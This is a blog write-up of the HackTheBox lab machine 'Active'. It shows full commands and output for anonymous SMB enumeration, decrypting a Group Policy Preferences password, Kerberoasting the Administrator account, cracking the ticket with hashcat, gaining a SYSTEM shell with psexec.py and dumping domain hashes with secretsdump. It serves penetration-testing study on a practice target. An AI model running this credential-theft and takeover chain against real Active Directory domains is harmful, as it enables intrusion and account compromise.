---
title: Active HackTheBox writeup made by a dumb !!!
author: dumbx90
date: 2019-12-24 14:10:00 +0800
categories: [Blogging, HTB, Writeup]
tags: [htb,pentest,windows,activedirectory,easy,retired]
---

![](https://github.com/dumbx90/dumbx90.github.io/blob/master/assets/img/commons/hackthebox/active-description.png?raw=true)

<script id="asciicast-wKyjZ7BdMOlv3jOgXx4S4D28h" src="https://asciinema.org/a/wKyjZ7BdMOlv3jOgXx4S4D28h.js" async></script>

## Sumary 

Active is a medium box. The goal is pwn the Active Directory. We made enumeration with smbclient, found the group police xml file with password that was decrypted. With this credential we continues enumeration with ldap and found that administrator user is prone to "Kerberoastable" -  a technique explained in DerbyCon2014. After used this technique  we achieve a shell with privileges of administrator in a Domain Controller.

## Skills Necessary  

- Enumeration
- Windows Active Directory Groups and Permissions 
- Active Directory basic knowledge 

## Skills Learned

- SMB Enumeration 
- Active Directory Enumeration
- Kerberoastable accounts 




## Recon 

A simple nmap scan reveals a lot of open ports:

```bash
dumbland () hackthebox/active/recon :: nmap --open -Pn -sVC  10.10.10.100 -oA active-default
Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-22 16:40 EDT
Stats: 0:03:23 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 98.53% done; ETC: 16:43 (0:00:02 remaining)
Nmap scan report for 10.10.10.100
Host is up (0.14s latency).
Not shown: 983 closed ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid:
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-04-22 20:42:01Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 1m02s
| smb2-security-mode:
|   2.02:
|_    Message signing enabled and required
| smb2-time:
|   date: 2020-04-22T20:42:58
|_  start_date: 2020-04-22T20:19:51

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ 
```

In the **nmap** output we have a lot information. For the moment keep in mind that machine is leaked the dns name-: **active.htb**. So I put in **/etc/hosts** the name of **active.htb**.  

Following the OSCP methodology I create a **TO-DO LIST** to initial foothold:

1. Try anonymous bind in **LDAP** service.
2. Try anonymous connection in **SMB** service.
3. Lookup for valid users in **KERBEROS** service.
4. Try ASREPRoasting with user found in step 1 or 3. 
5. Brute force with valid users found in  step 1 or 3 in **SMB** service.
6. Pray

Lets dive in this **to-do** list.



## Ldap

```bash	
dumbland () hackthebox/active/recon :: ldapsearch -h 10.10.10.100 -p 389 -x -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts
#

#
dn:
namingContexts: DC=active,DC=htb
namingContexts: CN=Configuration,DC=active,DC=htb
namingContexts: CN=Schema,CN=Configuration,DC=active,DC=htb
namingContexts: DC=DomainDnsZones,DC=active,DC=htb
namingContexts: DC=ForestDnsZones,DC=active,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

The leaked dns name is correct, so far so good until now.  Next step is try to dump the ldap:

```bash	

dumbland () hackthebox/active/recon :: ldapsearch -h 10.10.10.100 -p 389 -x -b "DC=active,DC=htb"                                                                           
# extended LDIF
#
# LDAPv3
# base <DC=active,DC=htb> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C09075A, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v1db1

# numResponses: 1
```

The result was not expected. So I move on to **smb service** : 

```bash
dumbland () hackthebox/active/recon :: smbclient  -L \\10.10.10.100 -N
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        Replication     Disk
        SYSVOL          Disk      Logon server share
        Users           Disk
SMB1 disabled -- no workgroup available
```

After a bit of research we found in replication has some  files access by anonymous session. I will download all at once:

```bash	
dumbland () hackthebox/active/recon :: smbclient //10.10.10.100/Replication -N
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  active.htb                          D        0  Sat Jul 21 06:37:44 2018

                10459647 blocks of size 4096. 4931950 blocks available
smb: \> promp on
smb: \> recurse on
smb: \> mget *
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\GPT.INI of size 23 as GPT.INI (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Group Policy\GPE.INI of size 119 as GPE.INI (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 1098 as GptTmpl.inf (1.7 KiloBytes/sec) (average 0.5 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as Groups.xml (0.8 KiloBytes/sec) (average 0.6 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Registry.pol of size 2788 as Registry.pol (3.5 KiloBytes/sec) (average 1.2 KiloBytes/sec)
getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\GPT.INI of size 22 as GPT.INI (0.0 KiloBytes/sec) (average 1.0 KiloBytes/sec)
```

Analyzing the download files we get a useful information:

```bash
dumbland () hackthebox/active/recon :: grep '.xml' -Ri active.htb
active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml:<?xml version="1.0" encoding="utf-8"?>


```

Lets see what is this file:

```bash
dumbland () hackthebox/active/recon :: cat active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

For better comprehension what we found, see links bellow. For now just decrypt this:

```bash
dumbland () hackthebox/active/recon :: gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
/usr/bin/gpp-decrypt:21: warning: constant OpenSSL::Cipher::Cipher is deprecated
GPPstillStandingStrong2k18
```

Now  we have a credential:

```bash
active.htb\SVC_TGS:GPPstillStandingStrong2k18
```

Following the guidelines of penetration tester, come back to **smb service**  and enumerate again, but now i have one cred. Lets see if I have more access:

```bash
dumbland () hackthebox/active/recon :: smbclient -L //10.10.10.100/ -U active.htb\\SVC_TGS%GPPstillStandingStrong2k18
        
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        Replication     Disk
        SYSVOL          Disk      Logon server share
        Users           Disk
SMB1 disabled -- no workgroup available
```



If I can , I can get the user flag here, but I am in business of pop up a nice shell, so lets move on and enumerate more, but for now with ldap:

```bash
dumbland () hackthebox/active/recon :: ldapsearch -x -h 10.10.10.100 -p 389 -D 'SVC_TGS' -w 'GPPstillStandingStrong2k18' -b "dc=active,dc=htb"   | head  -n 20
# extended LDIF
#
# LDAPv3
# base <dc=active,dc=htb> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# active.htb
dn: DC=active,DC=htb
objectClass: top
objectClass: domain
objectClass: domainDNS
distinguishedName: DC=active,DC=htb
instanceType: 5
whenCreated: 20180718184900.0Z
whenChanged: 20200422201941.0Z
subRefs: DC=ForestDnsZones,DC=active,DC=htb
subRefs: DC=DomainDnsZones,DC=active,DC=htb
subRefs: CN=Configuration,DC=active,DC=htb
```



Filter this list with grep or other similar tool we create a list of users:

```bash
dumbland () hackthebox/active/recon :: ldapsearch -x -h 10.10.10.100 -p 389 -D 'SVC_TGS' -w 'GPPstillStandingStrong2k18' -b "dc=active,dc=htb"   |  grep sAMAccountName | cut -d: -f2 | awk '{print $1}'
Administrator
Guest
Administrators
Users
Guests
Print
Backup
Replicator
Remote
Network
Performance
Performance
Distributed
IIS_IUSRS
Cryptographic
Event
Certificate
DC$
krbtgt
Domain
Domain
Schema
Enterprise
Cert
Domain
Domain
Domain
Group
RAS
Server
Account
Pre-Windows
Incoming
Windows
Terminal
Allowed
Denied
Read-only
Enterprise
DnsAdmins
DnsUpdateProxy
SVC_TGS
```

Lets filter this ldapsearch to lookup for user 

So far so good.   I used **GetAdUSer.py** from impacket scripts to dump all domain users:

```bash	
dumbland () hackthebox/active/recon :: ~/pentest/impacket/examples/GetADUsers.py -all active.htb/svc_tgs:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100                             

Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation

[*] Querying 10.10.10.100 for information about domain.
Name                  Email                           PasswordLastSet      LastLogon
--------------------  ------------------------------  -------------------  -------------------
Administrator                                         2018-07-18 15:06:40.351723  2018-07-30 13:17:40.656520
Guest                                                 <never>              <never>
krbtgt                                                2018-07-18 14:50:36.972031  <never>
SVC_TGS                                               2018-07-18 16:14:38.402764  2018-07-21 10:01:30.320277
```



I Combine booth user lists and sort them to remove duplicate names. Now Lets dive in "kerberoasting".

## Kerberoasting 101 for dummies

>  A common technique of gain privilege in a Active Directory Domain i revealed in DerbyCon 2014( See link for a better explanation).  Basic this technique get the hash  from Kerberos TGT, to crack them offline.



For lookup and found the user with this particular behavior I iused this query in **ldap service**:

```bash
dumbland () hackthebox/active/recon :: ldapsearch -x -h 10.10.10.100 -p 389 -D 'SVC_TGS' -w 'GPPstillStandingStrong2k18' -b "dc=active,dc=htb" -s sub "(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2)))" serviceprincipalname
# extended LDIF
#
# LDAPv3
# base <dc=active,dc=htb> with scope subtree
# filter: (&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2)))
# requesting: serviceprincipalname
#

# Administrator, Users, active.htb
dn: CN=Administrator,CN=Users,DC=active,DC=htb
servicePrincipalName: active/CIFS:445

# SVC_TGS, Users, active.htb
dn: CN=SVC_TGS,CN=Users,DC=active,DC=htb
```



So the administrator is configured with SPN that can be used for achieve a "kerberoasting"

```bash
dumbland () hackthebox/active/recon :: ~/pentest/impacket/examples/GetUserSPNs.pyactive.htb/svc_tgs:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100

Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2018-07-30 13:17:40.656520



dumbland () hackthebox/active/recon :: ~/pentest/impacket/examples/GetUserSPNs.py  active.htb/svc_tgs:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request
Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2018-07-30 13:17:40.656520

$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$9b78e5712a480f7bcece18985cce20ee$94571c184cc3e07bd5c47700342f4e98c502a2cc6607620f6f5764dce884272a97caf841f597582b66872cb9657520cd438ee7df51dd0b33a72b3a5f0b8a8698d5b01ef907d8495d559d539d098bb6425e4958ec039e0e3e995781b7e955706e1fb9e7f227cb84bd403c25151edd1e1a5b4b7812dfe05e443991f0e0664d40131be7832118f25916e280fd0903757f37c54fb0aa6e19bb8005cc7e3a1cd5574eff1675aeb98a47223651a91d85be910d81986f78d85947faa70fb77a73787ca0fcd803ca3c2347e852ce46b6093196767d868b4edfd927f1158297e4daccc168fdb9302006579e6b078a662c785741752c2b352c0f547fd1bda00e4ba3588d01403b81a20cb242cd2a0e6307eafece6f82982c559f6b3203016dfeda78a7d71f28e82e6398b06a12c9af30acc1937e03efcf11ea16c865a8f5e2c3af786ca834ef453010e6a9e69f6d00b2b9dbc9a23ac5276377c7acec16e21ac53c3936ba7a1042b24aa59d5025d7995562653235b463e3e1f9cdc8260eb92b884225057fbc8184901f62735665e2bd9e9e531366338d6c9babc7446231ed4f4632f4b6cacfdb5357a8f94fb1ab2040b06ac02cf44ef5cd977fe8413a51a4c60053277a7057d124826ae2bf4eb93b8af41015a967d7dd985d07d42d8329df1a25fa5057a4e7adb64ca30664f27f1003a92345ac1531770af11455dd01f04c766f866914af45a5a12e5a73c65190809c2f197ff4a8059cf8c047c42359d20b16208fc1bdb026d23bcb748277494d95d7a30a446d74783ea3c2644f3cb916f47edcfbabb8b484232cf2c7468b7f9bfdc173deede706d8f1d1f24f00d6114b87872d65014924089df5ab3b8d9c1f0c839efd18b70e5800883cf32317def0f23fcac5981436eb4e4a12cda8a3e970c68897a16cfa7b7477fc1f97beb07712f24401dcb0428210955a4b8b0f3eebf33665c40bb713130986aed1871c7738cce1ad00c7cd181409324ebf73097fa188c1fb09d6d2c5b23a54b9d2913ca48c2933703f70d174ecb70b9333dc96cf94983c8bebeba9f554b13c94ae8baa9755ddf890f590a3c306db1b8a8f7750e6018c531ae0bb67603a6d7d068a975150f25f52e5ef720a303055d84f04ed0650902d0014bd6f0aabc87c93d471678c2cc0a505073010d25c49972ddb377f2da38700b2430ee548826735c2aba0b6d7c01808f9e814163e0087dfb91d5202cc1976b215c977a07375914051cd67cd7646df80f0a9e8
```



Now it is *easy* part. Crack the hash.

```bash
dumbland () hackthebox/active/recon :: hashcat -m 13100 --force -a 0 admin-hash.txt
/mnt/hgfs/hackthebox/json/rockyou.txt
hashcat (v5.1.0) starting...

Applicable optimizers:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

Dictionary cache built:
* Filename..: /mnt/hgfs/hackthebox/json/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 12 secs

$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$e6e5465c0207f70f7daa8a8bd966d256$9b67ddda9d17bf4de3f0bdbbd649225b9ea59167bce028ddf2246553db5414b254c3abd3623afc507e0584cd0df21755993b2b52d4e2e596896f2e34833a4fc92f48eeda903876e51a69e08f6b73f61b6240aeb245ddfd9cc5f9dfd4aac1f5ba7a5d5ec23f4b1dfbc16a5dfb3b56fb6ff5e29c83eec46721f8896e99f71b45cd6ebe7e35b5b5bd47980ce42cf9e22c9cf8d75329cab9cb111b9037a3c52d0da115d7b732454aa2bb93dbc51eb84326f536f9bc0584839371b9852656a8fd89ffecf21b62c3ef54ca56ad00e7cf59619e453ed17edf1a4fdde342512aebe7db780be505f1caa643f4f62983aefc1746836337996683f95cf59bc5621ea6f6d246558fbb433aba27f942e6f4223d9cd01dc956fcd38e2ff59666645214311a5f66a44ede8263f24443bf2b62e80f6b1cdb99dc662d98127ae088d418b85fec1a2e8da223e82b3cf5670407d981b1eedacc39570fb930564e50b6f45236e2b301f165b948038598209867503670de2785944e79fd7418ac3218e9923de8bfad449e24a9f0aa60253631d3fe8b832f29b9e7ea333cb5e0fa2816ecd611add4b9175256fbd2abd9a82ef86c3efe5c984871f2f86e0991324c9d6702bef207e5c4c1dfa1cb2a144e7ed05ff5444b5978b416773c58026f18ecbf0c2572628af8915dc6c34f28d3373186977a694a8610265bec8ffbcde8f272a0f35bb8f3944c1ec4997dce6b7a1968a767074b00ad9bf765b2dadbb50d5b1802db5061c99cda7dc961171f0a99d87eacd024f22a1ee25532082f58fc6e43b04cad0217fe8a70133d5e82940cc1da716a36275cb3c98ff095e86a3fd76dee03d0a6b15a3576fee903316f95c077b8f308d8e6de7e7bbc905ef2ba46be8fecf9c1ebce2cb25531cdb7f4e1d3c44be46baf6e609cd288540bb09aeaf178929ad657edd688b00aeed6cab060bce37cb847e39d1eaa018ea602c7511dabf6a74ed9c1f4185bdbce717996452f11ecab387541af4f3b6a00ddc8c811fe35dee9af4814f548a79bd1da2108a8a84780219acd7f7ff3721c0461e0165de43277be490b10a14aa8981ecd414058257d531851f1bacb9d2f31fdfde09eeac5ec12bc2f3846a407eeb1b497d338599d858fb9703381ca6c2a96b64baee62180f3e58730a0bf1008a457fdbdd0b8bd483fe26108ab7ce5a6013801feb9275ced0fd2ec32c4e4b298400b0b7b60806dc3e9ac547eb055596dae5958d896f92d591e7f2feadbac869257:Ticketmaster1968
```



## Initial Shell (administrator)

I already know the port 445 is open, so let see what kind of privilege I have:

```bash
dumbland () hackthebox/active/recon :: crackmapexec smb 10.10.10.100 -u Administrator -p Ticketmaster1968


SMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:ACTIVE) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] ACTIVE\Administrator:Ticketmaster1968 (Pwn3d!)
```

Wonderful. My suspect is right. I am domain admin. 

```bash
dumbland () hackthebox/active/recon :: ~/pentest/impacket/examples/psexec.py administrator:Ticketmaster1968@10.10.10.100                                                                           1 ↵
Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation

[*] Requesting shares on 10.10.10.100.....
[*] Found writable share ADMIN$
[*] Uploading file epoVnOsF.exe
[*] Opening SVCManager on 10.10.10.100.....
[*] Creating service Tqti on 10.10.10.100.....
[*] Starting service Tqti.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>cd ]
The system cannot find the path specified.

C:\Windows\system32>cd
C:\Windows\system32

C:\Windows\system32>cd \

C:\>cd Users
d
AC:\Users>dminsitrator
The system cannot find the path specified.

C:\Users>cd Administrator

C:\Users\Administrator>cd Desktop

C:\Users\Administrator\Desktop>whoami
nt authority\system

C:\Users\Administrator\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 2AF3-72E4

 Directory of C:\Users\Administrator\Desktop

30/07/2018  04:50 úú    <DIR>          .
21/07/2018  06:06 úú                34 root.txtp
               1 File(s)             34 bytes
                2 Dir(s)  20.308.738.048 bytes free

C:\Users\Administrator\Desktop>ipconfig

Windows IP Configuration


Ethernet adapter Local Area Connection:

   Connection-specific DNS Suffix  . :
   IPv4 Address. . . . . . . . . . . : 10.10.10.100
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.10.10.2

Tunnel adapter isatap.{B3FEC2C7-47CA-4014-A441-A3A5CDDC983C}:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . :
```



## Bonus 

 Dump  the hashes of domain controller with secretsdump.py:

```bash
dumbland () hackthebox/active/recon :: /home/dumb/tools/impacket/examples/secretsdump.py active.htb/administrator:Ticketmaster1968@10.10.10.100
Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation

[*] Target system bootKey: 0xff954ee81ffb63937b563f523caf1d59
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5c15eb37006fb74c21a5d1e2144b726e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
ACTIVE\DC$:aes256-cts-hmac-sha1-96:f0258d770d95c6bb54bc743b41105ab5ae00ea0a38f562b1f4850bcd3641bf05
ACTIVE\DC$:aes128-cts-hmac-sha1-96:f4b167f9050caf3af9936b05dadfd998
ACTIVE\DC$:des-cbc-md5:a21f52adadd525ba
ACTIVE\DC$:aad3b435b51404eeaad3b435b51404ee:4c90238c3f1ac95e6eb30889bf0c71e0:::
[*] DefaultPassword
---------------------------------------snip------------------------------------------------
```





## Tools used in this post

- https://github.com/SecureAuthCorp/impacket
- https://github.com/byt3bl33d3r/CrackMapExec

## Terminal Customization 

- https://eugeny.github.io/terminus/

- https://ohmyz.sh/ (afowler theme)

- https://github.com/samoshkin/tmux-config

  

## Reference Links

- https://www.hackingarticles.in/credential-dumping-group-policy-preferences-gpp/
- https://www.irongeek.com/i.php?page=videos/derbycon4/t120-attacking-microsoft-kerberos-kicking-the-guard-dog-of-hades-tim-medin
- https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html
- https://www.blackhillsinfosec.com/a-toast-to-kerberoast/
- https://blog.stealthbits.com/extracting-service-account-passwords-with-kerberoasting/
- https://attack.stealthbits.com/cracking-kerberos-tgs-tickets-using-kerberoasting
- https://support.microsoft.com/en-gb/help/305144/how-to-use-useraccountcontrol-to-manipulate-user-account-properties
- https://www.tarlogic.com/en/blog/how-to-attack-kerberos/
- https://www.harmj0y.net/blog/redteaming/kerberoasting-revisited/

